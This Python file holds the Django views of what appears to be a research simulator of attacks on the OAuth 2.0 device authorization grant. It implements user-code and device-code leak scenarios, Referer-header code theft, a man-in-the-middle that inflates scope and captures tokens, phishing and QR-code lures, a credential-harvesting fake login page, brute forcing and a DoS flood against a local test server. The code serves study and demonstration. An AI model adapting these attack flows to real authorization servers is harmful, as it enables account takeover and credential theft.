from django.db.utils import OperationalError
from django.views.decorators.clickjacking import xframe_options_sameorigin
from django.http.response import HttpResponseForbidden, HttpResponseServerError
from django.shortcuts import render
from django.http import HttpResponse, JsonResponse, HttpResponseBadRequest
from django.urls.base import reverse
from django.utils.timezone import utc
from django.views.decorators.csrf import csrf_exempt
from django.utils.cache import patch_cache_control
from .tasks import initiate_N_device_flows, poll_for_grant_successful, brute_force_uc, brute_force_dc, polling
from .models import DeviceGrant as AttackerDeviceGrant, User, utility_object
from configuration.models import config_object
import os
from urllib.parse import urlencode
import json
from json import JSONDecodeError
import requests
from urllib.parse import urlencode, parse_qs
import pyqrcode
from datetime import datetime
import logging

logger = logging.getLogger(__name__)
headers = {'Content-type': 'application/x-www-form-urlencoded'}
attacker_device_name = "Charlie Ltd. Smart Refrigerator"


# The following views are for the User Code Leak scenario
@csrf_exempt
def leak_user_code(request):
    """Receives user_code in the User Code Leak scenario in spatial proximity.

    For simulation purposes the device directly leaks the user_code to the attacker.
    The attacker proceeds to register the device under his own account.

    Args:
        request (HttpRequest): HTTP request from client

    Returns:
        HttpResponse:
    """
    if request.method == 'POST':
        user_code = request.POST['user_code']
        logger.warning("Eve obtained user_code. Trying to connect the device to Eve's account...\
                       \n user_code: " + str(user_code))

        # try to connect device to the attacker's account
        login_data = dict(user_code=user_code, username="Eve", password="evil")
        login_request = requests.post(
            request.build_absolute_uri(reverse('authorization_server:authenticate')), 
            data=login_data)

        if not login_request.ok:
            logger.warning("Something went wrong. Eve was not able to connect.\
                           \n user_code: " + str(user_code))
        else:
            logger.warning("User Code Leak in spatial proximity was successful. \
                           Device is now connected to Eve's account!")
        return HttpResponse()
    else:
        return HttpResponseForbidden()


@xframe_options_sameorigin
def referer(request):
    """Returns advertisement and extracts user_code leaked via referer header.
    
    In referer header attack scenario, the attacker's advertisement is included on the login page
    in an iframe if the user calls verification_uri_complete. 
    The advertisement request is sent to this endpoint and the user_code is extracted using referer header.

    In the User Code Leak scenario, the attacker is authenticated at the AS. 
    In the Device Code Leak scenario, the attacker continues to retrieve the device_code \
        from the login page and starts polling to obtain an access_token with the user's account.
    """
    if request.method == 'GET':
        referer = request.META['HTTP_REFERER']
        user_code = referer.split('/')[-1]

        config = config_object()
        if config.attack_choice == "ucl":
            # User Code Leak not in Spatial Proximity
            logger.warning("User code obtained by means of referer header. \
                        Trying to connect the device to Eve's account...\n user_code: "
                        + str(user_code))
            login_data = dict(user_code=user_code, username="Eve", password="evil")
            login_request = requests.post(
                request.build_absolute_uri(reverse('authorization_server:authenticate')), 
                data=login_data)
            if not login_request.ok:
                logger.warning("Something went wrong. Eve was not able to connect.\
                                \n user_code: " + str(user_code))
            else:
                logger.warning("User Code Leak via referer header was successful. \
                                Device is now connected to Eve's account!")
        else:
            # Device Code Leak not in Spatial Proximity
            logger.warning("User code obtained by means of referer header. \
                        Trying to retrieve the device_code from login page...\n user_code: "
                        + str(user_code))
            login_page = requests.get(
                request.build_absolute_uri(reverse('authorization_server:device') 
                                           + "/" + user_code))
            # Extract device_code from login page
            try:
                device_code = int((str(login_page.content)).split("Device Code: ", 1)[1].split(" ", 1)[0])
                client_id_request = requests.post(
                    request.build_absolute_uri(reverse('authorization_server:find-client-id')), 
                    data=dict(device_code=device_code))
                client_id = int(client_id_request.json()['client_id'])

                logger.warning("Eve extracted a valid device_code. Start polling. \
                            \n device_code: " + str(device_code) + ", client_id: " + str(client_id))
                # set start time for timeout in polling
                utility = utility_object()
                utility.start_time = datetime.utcnow().replace(tzinfo=utc)
                while True:
                    try:
                        utility.save(); break
                    except OperationalError:
                        pass
                polling.delay(device_code, client_id,
                            request.build_absolute_uri('../..')[:-1])

            except (IndexError, ValueError, JSONDecodeError):
                logger.warning("Could not extract device_code from verification_uri_complete. \
                    Device Code Leak attack unsuccessful.")


        return render(request, 'attacker/ad.html')


@csrf_exempt
def brute_force_user_code(request):
    """Initiates brute force attack on user_code
    """
    brute_force_uc.delay(request.build_absolute_uri('../..')[:-1])
    return HttpResponse()


# The following views are for the Device Code Leak scenario
@csrf_exempt
def leak_device_code(request):
    """Receives device_code and client_id in the Device Code Leak scenario in spatial proximity.

    For simulation purposes the device directly leaks the data to the attacker.
    The attacker starts polling for an access_token.

    Args:
        request (HttpRequest): HTTP request from client

    Returns:
        HttpResponse:
    """
    if request.method == 'POST':
        try:
            device_code = request.POST['device_code']
            client_id = request.POST['client_id']
            logger.warning("Eve obtained device_code. Start polling. \
                           \n device_code: " + str(device_code))

            # set start time for timeout in polling
            utility = utility_object()
            utility.start_time = datetime.utcnow().replace(tzinfo=utc)
            while True:
                try:
                    utility.save(); break
                except OperationalError:
                    pass
            polling.delay(device_code, client_id,
                          request.build_absolute_uri('../..')[:-1])

        except:
            return HttpResponseBadRequest()

        return HttpResponse()
    else:
        return HttpResponseForbidden()


@csrf_exempt
def brute_force_device_code(request):
    """Initiates brute force attack on device_code
    """
    brute_force_dc.delay(request.build_absolute_uri('../..')[:-1])
    return HttpResponse()


# The following views are used in the Man in the Middle scenario
@csrf_exempt
def get_client_id(request):
    """MitM intercepts and forwards get_client_id request from device to AS 

    Args:
        request (HttpRequest): HTTP request from client

    Returns:
        HttpResponse: client_id response from AS
    """
    if request.method == 'POST':
        device_name = request.POST.get('device_name', '')

        # Get client_id for device from AS
        response = requests.post(
            request.build_absolute_uri('/authorization-server/get-client-id'),
            headers=headers, data={'device_name': device_name})
        # extract client_id
        client_id = parse_qs(response.text).get('client_id')[0]

        logger.warning("Attacker intercepted request of client_id from device to Alice-AS.\
            \n client_id: " + str(client_id))

        data = {'client_id': client_id}
        return HttpResponse(content_type='application/x-www-form-urlencoded',
                            content=urlencode(data))
    else:
        return HttpResponseForbidden()


@csrf_exempt
def authorization_endpoint(request):
    """MitM intercepts request to register device for device grant

    Provides client with device_code, user_code, verification_uri, verification_uri_complete, and interval needed for device grant.
    Attacker is greedy and sets scope to "FULL".

    Args:
        request (HttpRequest): HTTP request from client

    Returns:
        HttpResponse: Data needed for authorization or ResponseForbidden
    """
    if request.method == 'POST':
        client_id = request.POST['client_id']
        scope = request.POST.get('scope', '')

        # Register device for device grant
        if config_object().attack_choice == "mitm":
            scope = "FULL"
        # attacker changed scope to full scope
        data = {'client_id': client_id, 'scope': scope}
        response = requests.post(
            request.build_absolute_uri(
                '/authorization-server/authorization-endpoint'),
            headers=headers, data=urlencode(data))

        # Extract and store data from AS to device
        response_data = response.json()
        if not response.ok:
            data = {'error': response_data['error']}
            return JsonResponse(data=data)

        device_grant = AttackerDeviceGrant(
            device_code=response_data['device_code'],
            client_id=client_id,
            user_code=response_data['user_code'],
            verification_uri=response_data['verification_uri'],
            verification_uri_complete=response_data['verification_uri_complete'],
            user_code_lifetime=int(float(response_data['expires_in'])),
            interval=response_data['interval'],
            scope=scope)
        while True:
            try:
                device_grant.save(); break
            except OperationalError:
                pass

        logger.warning(
            "Attacker intercepted authorization_endpoint request from device to Alice-AS.\n \
                device_code: " + str(device_grant.device_code) + ", client_id: " 
            + str(device_grant.client_id) + ", user_code: "
            + str(device_grant.user_code) + ", scope: " + device_grant.scope)

        data = {
            'device_code': device_grant.device_code,
            'user_code': device_grant.user_code,
            'verification_uri': device_grant.verification_uri,
            'verification_uri_complete': device_grant.verification_uri_complete,
            'expires_in': device_grant.user_code_expires_in(),
            'interval': device_grant.interval}
        return JsonResponse(data=data)
    else:
        return HttpResponseForbidden()


@csrf_exempt
def token_endpoint(request):
    """MitM incercepts token endpoint requests from device to AS.

    If the user has approved the grant, a valid access_token and refresh_token is returned.

    Args:
        request (POST request): request must contain valid grant_type, device_code, and client_id

    Returns:
        JsonResponse: depending on status of authorization
    """
    if request.method == 'POST':

        keys = {'grant_type', 'device_code', 'client_id'}
        if not keys.issubset(request.POST.keys()):
            # forward error message from AS
            data = request.POST.dict()
            return requests.post(
                request.build_absolute_uri(
                    '/authorization-server/token-endpoint'),
                headers=headers, data=urlencode(data))

        client_id = request.POST['client_id']
        device_grant = AttackerDeviceGrant.objects.get(client_id=client_id)

        # forward to AS
        data = {'grant_type': request.POST['grant_type'],
                'device_code': request.POST['device_code'],
                'client_id': request.POST['client_id']}

        request = requests.post(request.build_absolute_uri(
            '/authorization-server/token-endpoint'),
            headers=headers, data=urlencode(data))

        if request.ok:
            # polling successful, retrieve data
            data = request.json()
            device_grant.authenticated = True
            device_grant.access_token = data['access_token']
            device_grant.access_token_creation_timestamp = datetime.utcnow().replace(tzinfo=utc)
            device_grant.access_token_lifetime = data['expires_in']
            device_grant.refresh_token = data['refresh_token']
            while True:
                try:
                    device_grant.save(); break
                except OperationalError:
                    pass
            logger.warning(
                "Attacker intercepted token_endpoint request from device to Alice-AS \
                and is now in possession of a valid access_token.\n \
                client_id: "
                + str(device_grant.client_id) + ", access_token: " 
                + str(device_grant.access_token) + ", refresh_token: " 
                + str(device_grant.refresh_token))

            # Complete device flow (MitM) if option is chosen
            config = config_object()
            if not (config.attack_choice == "mitm" and config.mitm_choice == ""):
                data = {
                    'access_token': device_grant.access_token,
                    'token_type': 'token_type',
                    'expires_in': device_grant.access_token_expires_in(),
                    'refresh_token': device_grant.refresh_token,
                    'scope': device_grant.scope
                }
                response = JsonResponse(data=data)
                patch_cache_control(response, no_cache=True)
                return response
            else:
                return HttpResponseServerError()

        elif request.status_code == 400:
            error = request.json()['error']
            return HttpResponseBadRequest(
                content_type='application/json', content=json.dumps(
                    {'error': error}))

        else:
            return HttpResponseServerError()

    else:
        return HttpResponseForbidden()


# Remote Phishing scenario
def remote_phishing(request):
    """Returns a HTML page simulating a phishing mail.

    The attacker initiates the device grant on a device in his possession and starts polling.
    verification_uri_complete is embedded in the simulated phishing mail.

    Args:
        request (HttpRequest): request from config

    Returns:
        HttpResponse: HTML page simulating phishing mail
    """
    # initiate device grant on attacker device
    logger.warning("Creating remote phishing email.")

    if config_object().rp_choice == "direct":
        # Link in Email is verification_uri_complete
        logger.warning("Initiate device grant on Eve's device.")
        data = {'attacker_device_name': attacker_device_name}
        response = requests.post(request.build_absolute_uri(
            reverse('device:grant')), headers=headers, data=data)
        verification_uri_complete = response.json()['verification_uri_complete']
        client_id = int(response.json()['client_id'])

        # periodically check if someone has authorized the device
        grant_successful_url = request.build_absolute_uri(
            reverse('device:grant-successful'))
        poll_for_grant_successful.delay(client_id, grant_successful_url)

        # render pseudo mail
        context = {'link': verification_uri_complete}

    else: 
        # Link in Email redirects to attacker server to obtain a new verification_uri_complete
        context = {'link': request.build_absolute_uri(
            reverse('attacker:rp-indirect'))}
    return render(request, 'attacker/phishing-mail.html', context)


def remote_phishing_indirect(request):
    """Returns a HTML page containing a new verification_uri_complete during remote phishing attack.

    The attacker initiates the device grant on a device in his possession and starts polling.
    verification_uri_complete is embedded in the simulated phishing alert.

    Args:
        request (HttpRequest): request from user clicking on link in phishing mail

    Returns:
        HttpResponse: HTML page simulating phishing alert
    """
    # Link in Email is verification_uri_complete
    logger.warning("Initiate device grant on Eve's device.")
    data = {'attacker_device_name': attacker_device_name}
    response = requests.post(request.build_absolute_uri(
        reverse('device:grant')), headers=headers, data=data)
    user_code = response.json()['user_code']
    verification_uri = response.json()['verification_uri']
    verification_uri_complete = response.json()['verification_uri_complete']
    client_id = int(response.json()['client_id'])

    # periodically check if someone has authorized the device
    grant_successful_url = request.build_absolute_uri(
        reverse('device:grant-successful'))
    poll_for_grant_successful.delay(client_id, grant_successful_url)

    # render pseudo mail
    context = {'user_code': user_code,
               'verification_uri': verification_uri,
               'verification_uri_complete': verification_uri_complete}
    return render(request, 'attacker/phishing-alert.html', context)


# CSRF with QR-Code scenario
def csrfqr(request):
    """Generates a QR-Code of verification_uri_complete to authorize a device of an attacker.

    Device grant is initiated on a device in possession of the attacker.

    Returns:
        HttpResponse: HTML page with QR-Code of verification_uri_completes
    """
    # initiate device grant on attacker device
    logger.warning("Initiate device grant on Eve's device.")
    data = {'attacker_device_name': attacker_device_name}
    response = requests.post(
        request.build_absolute_uri(reverse('device:grant')), 
        headers=headers, data=data)
    verification_uri_complete = response.json()['verification_uri_complete']
    client_id = int(response.json()['client_id'])

    # render qr-code with verification_uri_complete
    logger.warning(
        "Generate and post a QR-Code with verification_uri_complete.\n client_id: " 
        + str(client_id) + ", verification_uri_complete: " + verification_uri_complete)
    qr_code = pyqrcode.QRCode(verification_uri_complete)
    qr_code.png(os.path.abspath(os.path.dirname(__file__)) +
                '/static/attacker/qr_code.png', scale=10)

    # periodically check if someone has authorized the device
    grant_successful_url = request.build_absolute_uri(
        reverse('device:grant-successful'))
    poll_for_grant_successful.delay(client_id, grant_successful_url)

    # return HTML page with qr-code
    context = {'link': verification_uri_complete}
    return render(request, 'attacker/qr-code.html', context)


# The following views are for Corrupted Device Client scenario
def user_code_entry(request):
    """verification_uri is called during Corrupted Device Client scenario.

    Returns user code entry form

    Args:
        request (HttpRequest): POST via verification_uri

    Returns:
        HttpResponse: user code entry form
    """
    return render(request, 'attacker/login-user-code.html')


def verification_complete(request, user_code):
    """verification_uri_complete containing a user code is \
        called during Corrupted Device Client scenario.

    Checks validity of user code and redirects to login.

    Returns:
        HttpResponse: login form if user_code is valid, \
            user code entry form if user_code is invalid
    """
    device_grant = None
    try:
        device_grant = AttackerDeviceGrant.objects.get(user_code=user_code)
    except AttackerDeviceGrant.DoesNotExist:
        # Invalid user code
        context = {'error': 'User Code invalid'}
        return render(request, 'attacker/login-user-code.html', 
                      context, status=400)

    if not device_grant.user_code_valid():
        # Invalid user code
        context = {'error': 'User Code expired'}
        return render(request, 'attacker/login-user-code.html', 
                      context, status=400)

    # Continue with login
    # Display name of device if specified in configuration
    logger.warning('Eve received a valid user code. \n user_code: ' 
                   + str(user_code))
    # No need to show device_name as this is the attacker's login page
    context = {'user_code': user_code}
    return render(request, 'attacker/login.html', context)


def process_user_code(request):
    """Checks if entered user code is in database during Corrupted Device Client scenario.

    Args:
        request (HttpRequest): POST with user code from authentication

    Returns:
        HttpResponse: login page or retry with error
    """
    if request.method == 'POST':
        keys = {'user_code'}
        if not keys.issubset(request.POST.keys()):
            return HttpResponseBadRequest()

        user_code = request.POST['user_code']

        device_grant = None
        try:
            device_grant = AttackerDeviceGrant.objects.get(user_code=user_code)
        except AttackerDeviceGrant.DoesNotExist:
            # Invalid user code
            context = {'error': 'User Code invalid'}
            return render(request, 'attacker/login-user-code.html', 
                          context, status=400)

        # user_code has expired or already been used
        if not device_grant.user_code_valid() or device_grant.authenticated:
            context = {'error': 'User Code expired'}
            return render(request, 'attacker/login-user-code.html', 
                          context, status=400)

        # Continue with login
        # Display name of device if specified in configuration
        logger.warning('Valid user code entered: ' + str(user_code))
        context = {'user_code': user_code}
        return render(request, 'authorization_server/login.html', context)

    else:
        return HttpResponseForbidden()


def authenticate_ua(request):
    """User authentication and authorization during Corrupted Device Client scenario.

    Checks validity of user_code and retrieve user credentials.
    Optional authentication at Alice-AS to complete the device grant.

    Args:
        request (HttpRequest): Authentication request from user

    Returns:
        HttpResponse: success page or retry with error
    """
    if request.method == 'POST':
        keys = {'user_code', 'username', 'password'}
        if not keys.issubset(request.POST.keys()):
            return HttpResponseBadRequest()

        user_code = request.POST['user_code']
        username = request.POST['username']
        password = request.POST['password']

        logger.warning("Login credentials intercepted.\n username: " +
                       username + ", password: " + password)

        try:
            device_grant = AttackerDeviceGrant.objects.get(user_code=user_code)
        except AttackerDeviceGrant.DoesNotExist:
            # redirect to verification_uri
            context = {'user_code': user_code, 'error': 'User Code invalid'}
            return render(request, 'attacker/login-user-code.html', context)
            
        # authenticate user at Alice-AS
        login_data = dict(username=username, password=password, 
                            user_code=user_code)
        login_request = requests.post(
            request.build_absolute_uri(reverse('authorization_server:authenticate')),
            data=login_data)

        # validate user data
        if login_request.ok:
            user = User(username=username, password=password)
            while True:
                try:
                    user.save(); break
                except OperationalError:
                    pass

            device_grant.user = user  # connect grant to account
            device_grant.authenticated = True
            while True:
                try:
                    device_grant.save(); break
                except OperationalError:
                    pass
            logger.warning('Login credentials correct.')
            return render(request, 'attacker/success.html')

        # login credentials incorrect
        context = {'user_code': user_code,
                   'error': 'Login credentials invalid'}
        return render(request, 'attacker/login.html', context)
    else:
        return HttpResponseForbidden()


# Denial of Service scenario
@csrf_exempt
def denial_of_service_attack(request):
    """Initites number_of_devices concurrent device flows on simulated devices.

    Its goal is to exhaust the resources of the AS.

    Args:
        request (HttpRequest): request from configuration
    """
    config = config_object()

    logger.warning("Initiate simulated DDoS attack on " 
        + str(config.number_of_devices) + " devices.")
    initiate_N_device_flows.delay(
        request.build_absolute_uri('../device/grant'), 
        config.number_of_devices, attacker_device_name)

    return HttpResponse()